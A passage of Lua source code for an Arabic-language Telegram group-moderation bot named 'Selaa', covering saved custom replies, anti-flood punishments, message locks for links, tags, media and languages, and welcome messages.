if msg.content_.voice_ then Selaa:set(Selaa..'Selaa:Voice:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then Selaa:set(Selaa..'Selaa:Audio:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.audio_.audio_.persistent_id_) 
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
Selaa:set(Selaa..'Selaa:Photo:GpRed'..SaveGpRed..''..msg.chat_id_..'', photo_in_group) 
end
if msg.content_.animation_ then Selaa:set(Selaa..'Selaa:Gif:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
Selaa:set(Selaa..'Selaa:Text:GpRed'..SaveGpRed..''..msg.chat_id_..'', msg.content_.text_)
end 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حفظ الرد الجديد', 1, 'md') 
Selaa:del(Selaa..'Selaa:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'')
Selaa:del(Selaa..'DelManagerRep'..msg.chat_id_..'')
return false 
end 
end
if msg.content_.text_ and not Selaa:get(Selaa..'Selaa:Lock:GpRed'..msg.chat_id_) then 
if Selaa:get(Selaa..'Selaa:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, Selaa:get(Selaa..'Selaa:Video:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if Selaa:get(Selaa..'Selaa:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, Selaa:get(Selaa..'Selaa:File:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if Selaa:get(Selaa..'Selaa:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, Selaa:get(Selaa..'Selaa:Voice:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if Selaa:get(Selaa..'Selaa:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, Selaa:get(Selaa..'Selaa:Audio:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if Selaa:get(Selaa..'Selaa:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Selaa:get(Selaa..'Selaa:Photo:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end
if Selaa:get(Selaa..'Selaa:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, Selaa:get(Selaa..'Selaa:Gif:GpRed'..msg.content_.text_..''..msg.chat_id_..'')) 
end 
if Selaa:get(Selaa..'Selaa:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, Selaa:get(Selaa..'Selaa:Stecker:GpRed'..msg.content_.text_..''..msg.chat_id_..''))
end
if Selaa:get(Selaa..'Selaa:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'') then
function SelaaTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = Selaa:get(Selaa..'Selaa:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = Selaa:get(Selaa..'Selaa:Text:GpRed'..msg.content_.text_..''..msg.chat_id_..'')
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, SelaaTEAM)
end
end
--     Source Selaa     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = Selaa:get(Selaa.."Selaa:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = Selaa:get(Selaa..'DelSudoRep')
Selaa:del(Selaa.."Selaa:Sudo:AllRed",DelSudoRep)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء حفظ الرد', 1, 'md')
Selaa:del(Selaa.."Selaa:Add:AllText"..msg.sender_user_id_)
Selaa:del(Selaa.."Selaa:Add:AllRed"..msg.sender_user_id_)
Selaa:del(Selaa.."DelSudoRep")
return false
end
Selaa:del(Selaa.."Selaa:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = Selaa:get(Selaa.."Selaa:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
Selaa:set(Selaa.."Selaa:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
Selaa:set(Selaa.."Selaa:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
Selaa:set(Selaa.."Selaa:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
Selaa:set(Selaa.."Selaa:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
Selaa:set(Selaa.."Selaa:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
Selaa:set(Selaa.."Selaa:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
Selaa:set(Selaa.."Selaa:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
Selaa:set(Selaa.."Selaa:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حفظ الرد الجديد', 1, 'md') 
Selaa:del(Selaa.."Selaa:Add:AllText"..msg.sender_user_id_)
Selaa:del(Selaa..'DelSudoRep')
return false end end
if msg.content_.text_ and not Selaa:get(Selaa..'Selaa:Lock:AllRed'..msg.chat_id_) then
if Selaa:get(Selaa.."Selaa:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, Selaa:get(Selaa.."Selaa:Video:AllRed"..msg.content_.text_))
end
if Selaa:get(Selaa.."Selaa:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, Selaa:get(Selaa.."Selaa:File:AllRed"..msg.content_.text_))
end
if Selaa:get(Selaa.."Selaa:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, Selaa:get(Selaa.."Selaa:Voice:AllRed"..msg.content_.text_))
end
if Selaa:get(Selaa.."Selaa:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, Selaa:get(Selaa.."Selaa:Audio:AllRed"..msg.content_.text_))
end
if Selaa:get(Selaa.."Selaa:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Selaa:get(Selaa.."Selaa:Photo:AllRed"..msg.content_.text_))
end
if  Selaa:get(Selaa.."Selaa:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, Selaa:get(Selaa.."Selaa:Gif:AllRed"..msg.content_.text_))
end
if Selaa:get(Selaa.."Selaa:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, Selaa:get(Selaa.."Selaa:Stecker:AllRed"..msg.content_.text_))
end
if Selaa:get(Selaa.."Selaa:Text:AllRed"..msg.content_.text_) then
function SelaaTEAM(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = Selaa:get(Selaa..'Selaa:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = Selaa:get(Selaa.."Selaa:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, SelaaTEAM)
end
end 
--     Source Selaa     --
--       Spam Send        --
function NotSpam(msg,Type)
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
Text = '↯☆العضو ⇇ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..') \n↯☆قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,0,'md')
end,nil)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
Text = '↯☆العضو ⇇ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..') \n↯☆قام بالتكرار تم حذف رسائله '
SendText(msg.chat_id_,Text,0,'md')
end,nil) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if Type == "keed" then
https.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
Selaa:sadd(Selaa..'Selaa:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
Text = '↯☆العضو ⇇ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..') \n↯☆قام بالتكرار المحدد تم تقييده '
SendText(msg.chat_id_,Text,0,'md')
end,nil)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end  
if Type == "mute" then
Selaa:sadd(Selaa..'Selaa:Muted:'..msg.chat_id_,msg.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
Text = '↯☆العضو ⇇ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..') \n↯☆قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,0,'md')
end,nil)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end  
--  end functions Selaa --
--     Source Selaa     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= Selaa then
floods = Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(Selaa:get(Selaa.."Selaa:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
Selaa:setex(Selaa.."Selaa:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source Selaa     --
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(Selaa) then
Selaa:set(Selaa..'Selaa:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = Selaa:get(Selaa..'Selaa:PinnedMsg'..msg.chat_id_)
if pin_id and Selaa:get(Selaa..'Selaa:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if Selaa:get(Selaa..'Selaa:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
Selaa:del(Selaa..'Selaa:viewget'..msg.sender_user_id_)
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عدد مشاهدات المنشور هو ⇇ ('..msg.views_..') \n ', 1, 'md')
Selaa:del(Selaa..'Selaa:viewget'..msg.sender_user_id_)
end
end
--     Source Selaa     --
--         Photo          --
if msg_type == 'MSG:Photo' then
if not VipMem(msg) then
if msg.forward_info_ then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Photo]")
end
end
end
if Selaa:get(Selaa..'Selaa:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Photo]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Photo]")
end
end
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Photo]")
end
end
if msg.content_.caption_:match("#") then
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Photo]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Photo]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Photo]")
end
end
end
end
--     Source Selaa     --
--        Markdown        --
elseif msg_type == 'MSG:MarkDown' then
if Selaa:get(Selaa..'Selaa:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Selaa     --
--        Document        --
elseif msg_type == 'MSG:Document' then
if not VipMem(msg) then
if msg.forward_info_ then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Document]")
end
end
end
if Selaa:get(Selaa..'Selaa:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Document]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Document]")
end
end
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Document]")
end
end
if msg.content_.caption_:match("#") then
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [tag] [Document]")
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Web] [Document]")
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Arabic] [Document]")
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [English] [Document]")
end
end
end
end
--     Source Selaa     --
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Inline]")
end
end
--     Source Selaa     --
--        Sticker         --
elseif msg_type == 'MSG:Sticker' then
if not VipMem(msg) then
if Selaa:get(Selaa..'Selaa:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Sticker]")
end
end
elseif msg_type == 'MSG:JoinByLink' then
if Selaa:get(Selaa..'Selaa:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tgservice] [JoinByLink]")
return
end
function get_welcome(extra,result,success)
if Selaa:get(Selaa..'Selaa:Groups:Welcomes'..msg.chat_id_) then
text = Selaa:get(Selaa..'Selaa:Groups:Welcomes'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
local text = text:gsub('username',(result.username_ or 'sourcesela'))
Selaa(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end 
if Selaa:get(Selaa.."Selaa:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source Selaa     --
--      New User Add      --
elseif msg_type == 'MSG:NewUserAdd' then
if not Selaa:get(Selaa..'Selaa:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Selaa,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(Selaa) then 
if Selaa:sismember(Selaa..'Selaa:Groups',msg.chat_id_) then
BotText = "مفعله في السابق\n↯☆ارسل ⇇ الاوامر واستمتع بالمميزيات"
else 
BotText = "معطله يجب رفعي مشرف\n↯☆بعد ذلك يرجى ارسال امر ⇇ تفعيل\n↯☆سيتم رفع الادمنيه والمنشئ تلقائيا"
end 
local SelaaText = (Selaa:get(Selaa.."Selaa:Text:BotWelcome") or "↯☆مرحبا انا بوت اسمي "..NameBot.."\n↯☆حالة المجموعه ⇇ "..BotText.."\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉")
local SelaaPhoto = (Selaa:get(Selaa.."Selaa:Photo:BotWelcome") or abbas.photos_[0].sizes_[1].photo_.persistent_id_)
if Selaa:get(Selaa.."Selaa:Photo:BotWelcome") or abbas.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,SelaaPhoto,SelaaText)
else 
send(msg.chat_id_,msg.id_,SelaaText)
end 
end   
end
end,nil)
end
if Selaa:get(Selaa..'Selaa:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tgservice] [NewUserAdd]")
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if Selaa:get(Selaa.."Selaa:Lock:Welcome"..msg.chat_id_) then
if Selaa:get(Selaa..'Selaa:Groups:Welcomes'..msg.chat_id_) then
text = Selaa:get(Selaa..'Selaa:Groups:Welcomes'..msg.chat_id_)
else
text = '• نورت حبي \n• [firstname lastname] \n• [@username]'
end
local text = text:gsub('firstname',(msg.content_.members_[0].first_name_ or ''))
local text = text:gsub('lastname',(msg.content_.members_[0].last_name_ or ''))
local text = text:gsub('username',(msg.content_.members_[0].username_ or 'sourcesela'))
Selaa(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source Selaa     --
--        Contact         --
elseif msg_type == 'MSG:Contact' then
if not VipMem(msg) then
if msg.forward_info_ then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Contact]")
end
end
end
if Selaa:get(Selaa..'Selaa:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Contact]")
end
end
--     Source Selaa     --
--         Audio          --
elseif msg_type == 'MSG:Audio' then
if not VipMem(msg) then
if msg.forward_info_ then
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Fwd] [Audio]")
end
end
end
if Selaa:get(Selaa..'Selaa:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Audio]")
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Link] [Audio]")
end
end
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [Tag] [Audio]")
end
end
if msg.content_.caption_:match("#") then
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
print("Deleted [Lock] [abstag] [Audio]")
end
end
